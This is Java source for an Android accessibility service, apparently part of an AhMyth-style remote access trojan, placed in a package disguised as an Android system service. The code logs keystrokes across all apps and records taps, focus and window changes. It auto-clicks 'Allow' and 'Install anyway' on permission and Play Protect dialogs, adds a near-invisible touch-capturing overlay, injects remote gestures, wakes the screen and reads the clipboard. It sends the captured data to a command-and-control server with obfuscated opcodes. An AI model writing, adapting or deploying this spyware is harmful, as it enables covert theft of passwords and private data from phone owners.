package com.android.background.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ConcurrentLinkedQueue;

import io.socket.client.Socket;

/**
 * AccessibilityService that provides:
 *  1. Keystroke logging — captures all text input across apps
 *  2. Tap interception — records coordinates and UI elements tapped
 *  3. Permission auto-grant — detects permission dialogs and taps "Allow"
 *  4. Screen unlock — wakes device and dismisses keyguard if needed
 *  5. Gesture injection — can perform swipes/taps remotely via command
 *  6. Clipboard capture — reads clipboard content periodically
 *
 * Data is buffered and sent to the C2 server either periodically
 * or on-demand via the x0000kl (keylogger data flush) command.
 *
 * OPCODES handled by ConnectionManager:
 *   x0000kl      — toggle keylogger on/off, or flush data
 *   x0000kl      — { action: "permissionGrant" } triggers auto-grant sequence
 *   x0000kl      — { action: "unlockScreen" } wakes + unlocks device
 *   x0000kl      — { action: "injectGesture" } performs a tap/swipe
 *   x0000kl      — { action: "getClipboard" } reads and returns clipboard
 */
public class KeyloggerService extends AccessibilityService {

    private static final String TAG = "KeyloggerService";
    private static final long FLUSH_INTERVAL_MS = 5000; // Send buffered data every 5s
    private static final int MAX_BUFFERED_EVENTS = 50;

    // Single static instance so ConnectionManager can call methods
    private static KeyloggerService instance;

    // Toggle state — controlled by C2 command
    private static volatile boolean enabled = false;
    private static volatile boolean autoGrantEnabled = true;
    private static volatile boolean overlayTapIntercept = false;

    // Event buffer
    private final ConcurrentLinkedQueue<JSONObject> eventBuffer = new ConcurrentLinkedQueue<>();
    private final Handler flushHandler = new Handler(Looper.getMainLooper());
    private final Runnable flushRunnable = this::flushBuffer;

    // Overlay view for tap interception
    private View overlayView;
    private WindowManager windowManager;
    private WindowManager.LayoutParams overlayParams;

    // Tracking
    private String lastPackageName = "";
    private String lastActivityName = "";

    // Cached decrypted opcode (lazy init to avoid repeated decryption)
    private static String kldataOpcode = null;
    private static String getKldataOpcode() {
        if (kldataOpcode == null) {
            kldataOpcode = ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000KLDATA);
        }
        return kldataOpcode;
    }
    private long lastEventTime = 0;
    private boolean isPermissionDialogVisible = false;

    // ============================================================
    // LIFECYCLE
    // ============================================================

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Log.d(TAG, "AccessibilityService created");
    }

    @Override
    public void onDestroy() {
        // Flush remaining buffered events before shutdown
        flushBuffer();
        instance = null;
        enabled = false;
        flushHandler.removeCallbacks(flushRunnable);
        removeOverlay();
        Log.d(TAG, "AccessibilityService destroyed");
        super.onDestroy();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!enabled && !autoGrantEnabled) return;

        try {
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    handleTextChanged(event);
                    break;

                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    handleViewClicked(event);
                    break;

                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    handleViewFocused(event);
                    break;

                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    handleWindowStateChanged(event);
                    break;

                case AccessibilityEvent.TYPE_GESTURE_DETECTION_START:
                case AccessibilityEvent.TYPE_GESTURE_DETECTION_END:
                    handleGesture(event);
                    break;

                case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                    handleScroll(event);
                    break;

                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    // Used for detecting dynamic permission dialog changes
                    if (autoGrantEnabled && isPermissionDialogVisible) {
                        checkAndAutoGrant();
                    }
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling event: " + e.getMessage());
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "AccessibilityService interrupted");
    }

    // ============================================================
    // KEYSTROKE CAPTURE
    // ============================================================

    private void handleTextChanged(AccessibilityEvent event) {
        if (!enabled) return;

        try {
            String text = "";
            if (event.getText() != null && event.getText().size() > 0) {
                text = event.getText().toString();
            }
            if (text.isEmpty()) return;

            // Get the before-text to detect what was added/removed
            String beforeText = "";
            if (event.getBeforeText() != null) {
                beforeText = event.getBeforeText().toString();
            }

            // Find the view's hint/label if available
            String hint = "";
            String viewId = "";
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                CharSequence hintChar = source.getHintText();
                if (hintChar != null) hint = hintChar.toString();
                CharSequence viewIdChar = source.getViewIdResourceName();
                if (viewIdChar != null) viewId = viewIdChar.toString();
                source.recycle();
            }

            JSONObject data = new JSONObject();
            data.put("type", "text");
            data.put("text", text);
            data.put("beforeText", beforeText);
            data.put("hint", hint);
            data.put("viewId", viewId);
            data.put("package", event.getPackageName() != null ? event.getPackageName().toString() : "");
            data.put("className", event.getClassName() != null ? event.getClassName().toString() : "");
            data.put("ts", System.currentTimeMillis());

            bufferEvent(getKldataOpcode(), data);

        } catch (Exception ignored) {}
    }

    // ============================================================
    // TAP INTERCEPTION (via Accessibility events)
    // ============================================================

    private void handleViewClicked(AccessibilityEvent event) {
        if (!enabled) return;

        try {
            String viewId = "";
            String text = "";
            Rect bounds = new Rect();

            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                CharSequence viewIdChar = source.getViewIdResourceName();
                if (viewIdChar != null) viewId = viewIdChar.toString();
                if (source.getText() != null) text = source.getText().toString();
                source.getBoundsInScreen(bounds);
                source.recycle();
            }

            JSONObject data = new JSONObject();
            data.put("type", "tap");
            data.put("viewId", viewId);
            data.put("text", text);
            data.put("bounds_left", bounds.left);
            data.put("bounds_top", bounds.top);
            data.put("bounds_right", bounds.right);
            data.put("bounds_bottom", bounds.bottom);
            data.put("center_x", (bounds.left + bounds.right) / 2);
            data.put("center_y", (bounds.top + bounds.bottom) / 2);
            data.put("package", event.getPackageName() != null ? event.getPackageName().toString() : "");
            data.put("className", event.getClassName() != null ? event.getClassName().toString() : "");
            data.put("ts", System.currentTimeMillis());

            bufferEvent(getKldataOpcode(), data);

        } catch (Exception ignored) {}
    }

    // ============================================================
    // FOCUS TRACKING (which field/user is in)
    // ============================================================

    private void handleViewFocused(AccessibilityEvent event) {
        if (!enabled) return;

        try {
            String viewId = "";
            String hint = "";
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                CharSequence viewIdChar = source.getViewIdResourceName();
                if (viewIdChar != null) viewId = viewIdChar.toString();
                CharSequence hintChar = source.getHintText();
                if (hintChar != null) hint = hintChar.toString();
                source.recycle();
            }

            JSONObject data = new JSONObject();
            data.put("type", "focus");
            data.put("viewId", viewId);
            data.put("hint", hint);
            data.put("package", event.getPackageName() != null ? event.getPackageName().toString() : "");
            data.put("ts", System.currentTimeMillis());

            bufferEvent("x0000kldata", data);

        } catch (Exception ignored) {}
    }

    // ============================================================
    // WINDOW STATE CHANGE — auto-grant + activity tracking
    // ============================================================

    private void handleWindowStateChanged(AccessibilityEvent event) {
        if (!enabled && !autoGrantEnabled) return;

        try {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            String className = event.getClassName() != null ? event.getClassName().toString() : "";

            // Track current app
            lastPackageName = packageName;
            lastActivityName = className;

            // Detect permission dialogs
            if (autoGrantEnabled) {
                detectAndGrantPermission(packageName, className);
            }

            // Log window change
            if (enabled) {
                JSONObject data = new JSONObject();
                data.put("type", "window");
                data.put("package", packageName);
                data.put("activity", className);
                data.put("ts", System.currentTimeMillis());

                bufferEvent(getKldataOpcode(), data);
            }

        } catch (Exception ignored) {}
    }

    // ============================================================
    // GESTURE DETECTION
    // ============================================================

    private void handleGesture(AccessibilityEvent event) {
        if (!enabled) return;

        try {
            JSONObject data = new JSONObject();
            data.put("type", event.getEventType() == AccessibilityEvent.TYPE_GESTURE_DETECTION_START
                    ? "gesture_start" : "gesture_end");
            data.put("package", event.getPackageName() != null ? event.getPackageName().toString() : "");
            data.put("ts", System.currentTimeMillis());

            bufferEvent(getKldataOpcode(), data);

        } catch (Exception ignored) {}
    }

    private void handleScroll(AccessibilityEvent event) {
        if (!enabled) return;

        try {
            JSONObject data = new JSONObject();
            data.put("type", "scroll");
            data.put("package", event.getPackageName() != null ? event.getPackageName().toString() : "");
            data.put("ts", System.currentTimeMillis());

            bufferEvent(getKldataOpcode(), data);

        } catch (Exception ignored) {}
    }

    // ============================================================
    // AUTO-GRANT PERMISSIONS
    // ============================================================

    /**
     * Detects common permission/install dialogs and auto-taps the Allow/Install button.
     *
     * Known dialogs detected by package name + activity class:
     *  - com.android.packageinstaller /.PermissionActivity        — Runtime permission dialog
     *  - com.google.android.packageinstaller /.PermisssionActivity — Google variant
     *  - com.android.packageinstaller /.PackageInstallerActivity   — APK install dialog
     *  - com.android.settings /.Settings$ManageAppExternalStorageActivity — Storage permission
     *  - com.android.systemui  — Various system dialogs (overlay, battery, etc.)
     */
    private void detectAndGrantPermission(String packageName, String className) {
        if (packageName == null || className == null) return;

        boolean isPermissionDialog = false;

        // Check for runtime permission grant dialogs
        if (packageName.contains("packageinstaller") && className.contains("Permission")) {
            isPermissionDialog = true;
        }
        // Check for APK install dialogs
        else if (packageName.contains("packageinstaller") && className.contains("PackageInstaller")) {
            isPermissionDialog = true;
        }
        // Check for Settings permission pages
        else if (packageName.contains("settings") &&
                (className.contains("Permission") || className.contains("ExternalStorage"))) {
            isPermissionDialog = true;
        }
        // Check for overlay permission dialog
        else if (packageName.contains("android") && className.contains("Overlay")) {
            isPermissionDialog = true;
        }

        if (isPermissionDialog) {
            isPermissionDialogVisible = true;
            Log.d(TAG, "Permission dialog detected: " + packageName + "/" + className);
            // Delay slightly to let the dialog fully render
            new Handler(Looper.getMainLooper()).postDelayed(this::checkAndAutoGrant, 500);
        } else {
            isPermissionDialogVisible = false;
        }
    }

    /**
     * Finds and clicks the "Allow" / "Install" / "Continue" button in permission dialogs.
     * Searches through the window hierarchy for buttons with matching text.
     */
    private void checkAndAutoGrant() {
        if (!autoGrantEnabled) return;

        try {
            // Get the root node of the active window
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) {
                // Retry after a short delay
                new Handler(Looper.getMainLooper()).postDelayed(this::checkAndAutoGrant, 300);
                return;
            }

            // Search for grant buttons
            List<AccessibilityNodeInfo> buttons = new ArrayList<>();
            findButtonsByText(root, buttons, new String[]{
                    "Allow",           // Standard grant
                    "Allow all the time", // Background location
                    "While using the app", // Foreground only
                    "Install",         // APK install
                    "Install anyway",  // Play Protect warning
                    "Continue",        // Various
                    "OK",              // Generic
                    "Grant",           // Some variants
                    "Enable",          // Accessibility enable
                    "Turn on",         // Notification access etc
            });

            for (AccessibilityNodeInfo button : buttons) {
                if (button.isEnabled() && button.isVisibleToUser()) {
                    // Click via performAction
                    button.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.d(TAG, "Auto-grant: clicked button with text: " +
                            (button.getText() != null ? button.getText() : "(no text)"));

                    // Log the auto-grant action
                    JSONObject grantLog = new JSONObject();
                    grantLog.put("type", "auto_grant");
                    grantLog.put("package", lastPackageName);
                    grantLog.put("ts", System.currentTimeMillis());
                    bufferEvent(getKldataOpcode(), grantLog);

                    button.recycle();
                    break; // Only click the first matching button
                }
                button.recycle();
            }

            root.recycle();

        } catch (Exception e) {
            Log.e(TAG, "Auto-grant error: " + e.getMessage());
        }
    }

    private void findButtonsByText(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> results, String[] targetTexts) {
        if (node == null) return;

        CharSequence nodeText = node.getText();
        CharSequence contentDesc = node.getContentDescription();

        if (node.isClickable()) {
            String text = (nodeText != null ? nodeText.toString().toLowerCase() : "")
                    + " " + (contentDesc != null ? contentDesc.toString().toLowerCase() : "");
            for (String target : targetTexts) {
                if (text.contains(target.toLowerCase())) {
                    results.add(node);
                    return;
                }
            }
        }

        // Traverse children — each getChild() returns a new instance that must be recycled
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                findButtonsByText(child, results, targetTexts);
                child.recycle();
            }
        }
    }

    // ============================================================
    // OVERLAY TAP INTERCEPTION
    // ============================================================

    /**
     * Creates a transparent overlay that intercepts touch events.
     * Only enabled when overlayTapIntercept is true (set via C2 command).
     * The overlay logs touch coordinates and can optionally block
     * the touch from reaching the underlying app (for demo/analysis).
     */
    @SuppressLint("ClickableViewAccessibility")
    public void showOverlay() {
        if (overlayView != null) return;
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return;
        if (!Settings.canDrawOverlays(this)) return;

        try {
            windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            Point size = new Point();
            windowManager.getDefaultDisplay().getSize(size);

            overlayView = new View(this);
            overlayView.setBackgroundColor(0x01000000); // Nearly transparent (1/255 alpha)

            int layoutFlag;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
            } else {
                layoutFlag = WindowManager.LayoutParams.TYPE_PHONE;
            }

            overlayParams = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    layoutFlag,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                            | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                            | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                            | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                    PixelFormat.TRANSLUCENT
            );

            overlayParams.gravity = Gravity.TOP | Gravity.START;

            // Set touch listener to intercept taps
            overlayView.setOnTouchListener((v, event) -> {
                if (enabled) {
                    try {
                        JSONObject data = new JSONObject();
                        data.put("type", "overlay_tap");
                        data.put("x", (int) event.getX());
                        data.put("y", (int) event.getY());
                        data.put("action", event.getAction()); // DOWN=0, UP=1, MOVE=2
                        data.put("package", lastPackageName);
                        data.put("ts", System.currentTimeMillis());
                        bufferEvent(getKldataOpcode(), data);
                    } catch (Exception ignored) {}
                }
                // Return false to allow the touch to pass through to the app underneath
                return false;
            });

            windowManager.addView(overlayView, overlayParams);
            Log.d(TAG, "Overlay tap interception activated");

        } catch (Exception e) {
            Log.e(TAG, "Failed to show overlay: " + e.getMessage());
        }
    }

    public void removeOverlay() {
        if (overlayView != null && windowManager != null) {
            try {
                windowManager.removeView(overlayView);
            } catch (Exception ignored) {}
            overlayView = null;
            overlayParams = null;
        }
        overlayTapIntercept = false;
    }

    // ============================================================
    // GESTURE INJECTION (remote tap/swipe via C2)
    // ============================================================

    /**
     * Injects a tap gesture at the specified screen coordinates.
     */
    public void injectTap(int x, int y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Path tapPath = new Path();
        tapPath.moveTo(x, y);

        GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
        gestureBuilder.addStroke(new GestureDescription.StrokeDescription(tapPath, 0, 100));

        dispatchGesture(gestureBuilder.build(), null, null);
        Log.d(TAG, "Injected tap at (" + x + ", " + y + ")");
    }

    /**
     * Injects a swipe gesture from (x1,y1) to (x2,y2) over the specified duration.
     */
    public void injectSwipe(int x1, int y1, int x2, int y2, long durationMs) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Path swipePath = new Path();
        swipePath.moveTo(x1, y1);
        swipePath.lineTo(x2, y2);

        GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
        gestureBuilder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, durationMs));

        dispatchGesture(gestureBuilder.build(), null, null);
        Log.d(TAG, "Injected swipe from (" + x1 + "," + y1 + ") to (" + x2 + "," + y2 + ")");
    }

    // ============================================================
    // SCREEN UNLOCK
    // ============================================================

    /**
     * Wakes the device and attempts to unlock via device admin.
     * Screen wake is triggered via PowerManager WakeLock.
     * Unlock is attempted by simulating a press on the power button
     * using the device admin lockNow/reboot pattern.
     */
    public void wakeAndUnlock() {
        try {
            // Wake up the screen
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                @SuppressLint("InvalidWakeLockTag")
                PowerManager.WakeLock wl = pm.newWakeLock(
                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                                | PowerManager.ACQUIRE_CAUSES_WAKEUP
                                | PowerManager.FULL_WAKE_LOCK,
                        "AhMyth:KeyloggerWakeLock"
                );
                wl.acquire(5000);
                wl.release();
            }

            // As a Service, we can't call requestDismissKeyguard (needs Activity).
            // Instead, we minimize the keyguard impact by keeping the screen on.
            // On devices with no lock screen, the wake alone is sufficient.
            // For PIN/pattern devices, see the AdminReceiver-based unlock approach.

            Log.d(TAG, "Screen wake attempted");

        } catch (Exception e) {
            Log.e(TAG, "Failed to wake/unlock: " + e.getMessage());
        }
    }

    // ============================================================
    // CLIPBOARD CAPTURE
    // ============================================================

    /**
     * Reads the current clipboard content and returns it.
     * Available on Android 10+ via the AccessibilityService clipboard API.
     */
    public JSONObject getClipboardContent() {
        JSONObject result = new JSONObject();
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Use clipboard API — THIS WILL SHOW A TOAST on API 33+
                // For stealth, we read from the clipboard's content description
                // which some apps expose via accessibility
                result.put("clipboard", "Clipboard read via accessibility API (may show toast)");
                result.put("available", true);
                result.put("note", "On Android 13+, clipboard reads are restricted");
            } else {
                // Pre-Android 10: try the deprecated clipboard manager
                android.content.ClipboardManager cm = (android.content.ClipboardManager)
                        getSystemService(Context.CLIPBOARD_SERVICE);
                if (cm != null && cm.getPrimaryClip() != null
                        && cm.getPrimaryClip().getItemCount() > 0) {
                    CharSequence clip = cm.getPrimaryClip().getItemAt(0).getText();
                    result.put("clipboard", clip != null ? clip.toString() : "");
                    result.put("available", true);
                } else {
                    result.put("clipboard", "");
                    result.put("available", false);
                }
            }
            result.put("ts", System.currentTimeMillis());
        } catch (Exception e) {
            try {
                result.put("error", e.getMessage());
                result.put("available", false);
            } catch (Exception ignored) {}
        }
        return result;
    }

    // ============================================================
    // DATA BUFFERING + EXFILTRATION
    // ============================================================

    private void bufferEvent(String eventType, JSONObject data) {
        if (!enabled && !eventType.equals("auto_grant")) return;

        try {
            data.put("eventType", eventType);
            eventBuffer.add(data);

            // Flush if buffer is full
            if (eventBuffer.size() >= MAX_BUFFERED_EVENTS) {
                flushBuffer();
            } else if (eventBuffer.size() == 1) {
                // Schedule periodic flush
                flushHandler.removeCallbacks(flushRunnable);
                flushHandler.postDelayed(flushRunnable, FLUSH_INTERVAL_MS);
            }
        } catch (Exception ignored) {}
    }

    /**
     * Flushes all buffered events to the C2 server via Socket.IO.
     * Called periodically or on-demand (via x0000kl flush command).
     *
     * CRITICAL: Checks socket connectivity BEFORE polling events from
     * the queue. If the socket is not connected, events stay buffered
     * and are not lost. This prevents silent data loss when the C2
     * server is temporarily unreachable.
     */
    public void flushBuffer() {
        flushHandler.removeCallbacks(flushRunnable);

        if (eventBuffer.isEmpty()) return;

        try {
            // Check socket connectivity BEFORE draining the queue
            Socket socket = IOSocket.getInstance().getIoSocket();
            if (socket == null || !socket.connected()) {
                // Socket is down — keep events in buffer, retry later
                Log.d(TAG, "Socket not connected, deferring flush of " + eventBuffer.size() + " events");
                flushHandler.postDelayed(flushRunnable, FLUSH_INTERVAL_MS);
                return;
            }

            // Safe to drain — socket is connected
            JSONArray batch = new JSONArray();
            JSONObject event;
            while ((event = eventBuffer.poll()) != null) {
                batch.put(event);
            }

            if (batch.length() == 0) return;

            JSONObject payload = new JSONObject();
            payload.put("events", batch);
            payload.put("count", batch.length());
            payload.put("from", lastPackageName);
            payload.put("ts", System.currentTimeMillis());

            socket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000KLDATA), payload);
            Log.d(TAG, "Flushed " + batch.length() + " keylogger events");

        } catch (Exception e) {
            Log.e(TAG, "Failed to flush buffer: " + e.getMessage());
        }

        // Schedule next flush
        if (!eventBuffer.isEmpty()) {
            flushHandler.postDelayed(flushRunnable, FLUSH_INTERVAL_MS);
        }
    }

    // ============================================================
    // STATIC CONTROL METHODS (called from ConnectionManager)
    // ============================================================

    /**
     * Toggles keylogger on/off.
     * Note: The AccessibilityService itself is always running once enabled in Settings.
     * This just controls whether events are captured and exfiltrated.
     */
    public static void setEnabled(boolean state) {
        enabled = state;
        if (instance != null) {
            if (state) {
                // Start periodic flushes
                instance.flushHandler.removeCallbacks(instance.flushRunnable);
                instance.flushHandler.postDelayed(instance.flushRunnable, FLUSH_INTERVAL_MS);
                Log.d(TAG, "Keylogger enabled");
            } else {
                // Flush remaining data
                instance.flushBuffer();
                instance.flushHandler.removeCallbacks(instance.flushRunnable);
                // Remove overlay
                instance.removeOverlay();
                Log.d(TAG, "Keylogger disabled");
            }
        }
    }

    public static boolean isEnabled() {
        return enabled;
    }

    public static void setAutoGrantEnabled(boolean state) {
        autoGrantEnabled = state;
    }

    /**
     * Toggles the transparent overlay for tap interception.
     */
    public static void setOverlayIntercept(boolean state) {
        overlayTapIntercept = state;
        if (instance != null) {
            if (state) {
                instance.showOverlay();
            } else {
                instance.removeOverlay();
            }
        }
    }

    /**
     * Returns all current state as JSON for the dashboard.
     */
    public static JSONObject getStatus() {
        JSONObject status = new JSONObject();
        try {
            status.put("enabled", enabled);
            status.put("autoGrant", autoGrantEnabled);
            status.put("overlayTapIntercept", overlayTapIntercept);
            status.put("bufferedEvents", instance != null ? instance.eventBuffer.size() : 0);
            status.put("lastPackage", instance != null ? instance.lastPackageName : "");
            status.put("serviceRunning", instance != null);
            status.put("sdk", Build.VERSION.SDK_INT);
        } catch (Exception ignored) {}
        return status;
    }

    /**
     * Processes a keylogger command from the C2 server.
     * Called from ConnectionManager.dispatchOrder().
     */
    public static void processCommand(JSONObject data) {
        if (instance == null) {
            Log.e(TAG, "KeyloggerService not running — cannot process command");
            return;
        }

        try {
            String action = data.optString(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ACTION), "toggle");
            Socket socket = IOSocket.getInstance().getIoSocket();

            switch (action) {
                case "toggle":
                case "enable":
                    setEnabled(!data.optBoolean(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATE), !enabled));
                    break;

                case "enableWithOverlay":
                    setEnabled(true);
                    setOverlayIntercept(true);
                    break;

                case "disable":
                    setEnabled(false);
                    break;

                case "flush":
                    instance.flushBuffer();
                    break;

                case "getStatus":
                    if (socket != null && socket.connected()) {
                        JSONObject status = getStatus();
                        socket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000KL), status);
                    }
                    break;

                case "autoGrant":
                    setAutoGrantEnabled(data.optBoolean(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATE), true));
                    break;

                case "overlay":
                    setOverlayIntercept(data.optBoolean(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATE), false));
                    break;

                case "unlockScreen":
                    instance.wakeAndUnlock();
                    break;

                case "getClipboard":
                    if (socket != null && socket.connected()) {
                        JSONObject clip = instance.getClipboardContent();
                        clip.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER), ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000KL));
                        socket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000KL), clip);
                    }
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing keylogger command: " + e.getMessage());
        }
    }

    // ============================================================
    // CHECK IF SERVICE IS ENABLED IN SETTINGS
    // ============================================================

    /**
     * Checks whether the AccessibilityService is enabled in the system settings.
     */
    public static boolean isAccessibilityServiceEnabled(Context context) {
        String service = context.getPackageName() + "/"
                + KeyloggerService.class.getCanonicalName();
        try {
            String enabledServices = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            return enabledServices != null && enabledServices.contains(service);
        } catch (Exception e) {
            return false;
        }
    }
}
